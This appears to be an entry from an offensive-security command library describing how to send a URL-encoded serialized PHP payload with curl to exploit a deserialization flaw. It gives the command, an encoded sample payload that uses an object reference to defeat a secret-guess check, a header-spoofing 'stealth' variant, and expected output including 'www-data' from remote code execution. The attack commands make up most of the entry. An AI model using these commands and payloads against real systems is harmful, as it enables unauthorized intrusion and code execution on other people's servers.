---
id: b5900cb2-f60f-40fc-ae90-ecb057fb658f
name: curl-send-php-serialized-payload
type: command
executor: bash
data: curl "$_TARGET_URL?input=$_SERIALIZED_PAYLOAD"
output: null
created_at: '2023-04-06T03:55:59.357473+00:00'
updated_at: '2023-04-06T03:55:59.362661+00:00'
platforms:
  - Linux
  - macOS
  - Web
tags:
  - web
  - exploit
  - php
verified: true
validated: true
---

# curl-send-php-serialized-payload

## Command

```bash
curl "$_TARGET_URL?input=$_SERIALIZED_PAYLOAD"
```

## Description

This command sends a URL-encoded serialized PHP payload to a vulnerable endpoint to trigger object injection. Use it after crafting the payload to exploit deserialization flaws, observing the response for bypass or execution success.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | Full URL of the vulnerable PHP script (e.g., http://target.com/vuln.php) | Yes |
| $_SERIALIZED_PAYLOAD | The serialized object or array string (URL-encode special chars like : to %3A) | Yes |

## Examples

### Basic Usage

```bash
curl "http://target.com/vuln.php?input=O%3A13%3A%5C%22ObjectExample%5C%22%3A2%3A%7Bs%3A10%3A%5C%22secretCode%5C%22%3BN%3Bs%3A5%3A%5C%22guess%5C%22%3BR%3A2%3B%7D"
```

### Advanced Usage (with Headers for Stealth)

```bash
curl -H "User-Agent: Mozilla/5.0" -H "Referer: http://target.com" "$_TARGET_URL?input=$_SERIALIZED_PAYLOAD"
```

## Expected Output

Successful exploitation returns the application's response, such as:

```
Win
```

Or for RCE:
```
www-data
```

(From a 'whoami' command). Errors may show PHP notices if the payload is malformed.

## Related

- [[procedures/Exploit-PHP-Object-Injection-for-Arbitrary-Code-Execution]]
- [[codes/PHP-Serialized-ObjectExample-Payload-For-Secret-Guess]]
